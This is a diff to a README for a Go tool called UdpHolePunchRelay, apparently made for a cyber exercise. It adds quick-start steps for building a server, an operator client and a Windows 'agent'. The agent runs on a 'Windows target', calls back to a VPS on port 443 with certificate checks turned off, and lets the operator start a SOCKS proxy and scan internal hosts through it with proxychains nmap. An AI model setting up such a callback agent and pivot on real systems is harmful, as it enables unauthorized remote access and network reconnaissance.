@@ -12,6 +12,55 @@
 
 ---
 
+## Test Environment Quick Start
+
+### Step 1 — Build binaries (run once from WSL)
+```bash
+cd "/mnt/c/Users/csrf/Desktop/Cyber Shield 26 FINAL/UdpHolePunchRelay"
+GOOS=linux  GOARCH=amd64 CGO_ENABLED=0 go build -ldflags '-s -w' -o bin/holepunch-server-linux  ./cmd/server
+GOOS=linux  GOARCH=amd64 CGO_ENABLED=0 go build -ldflags '-s -w' -o bin/holepunch-client-linux  ./cmd/client
+GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags '-s -w' -o bin/holepunch-agent-windows.exe ./cmd/client
+```
+
+### Step 2 — Generate operator keypair (run once on Linux operator box)
+```bash
+./holepunch-client-linux -keygen ~/.holepunch/operator.key
+# Prints a public key line — copy it for Step 3
+```
+
+### Step 3 — Authorize the operator key on the server
+```bash
+echo "<paste pubkey line here>" > authorized_keys
+```
+
+### Step 4 — Start the orchestration server (Linux VPS)
+```bash
+./holepunch-server-linux
+```
+
+### Step 5 — Start the agent (Windows target)
+```cmd
+holepunch-agent-windows.exe -server <SERVER_IP>:443 -ignorecert
+```
+
+### Step 6 — Connect as operator (Linux operator box)
+```bash
+sudo ./holepunch-client-linux -server <SERVER_IP>:443 -ignorecert -key ~/.holepunch/operator.key
+```
+
+### Step 7 — Start a session and proxy
+```
+[HolePunch] >> agents
+[HolePunch] >> session <first 4+ chars of agent ID>
+[HolePunch] >> socks start
+```
+
+```bash
+proxychains nmap -sT -Pn <target>
+```
+
+---
+
 ## Build
 
 ```bash
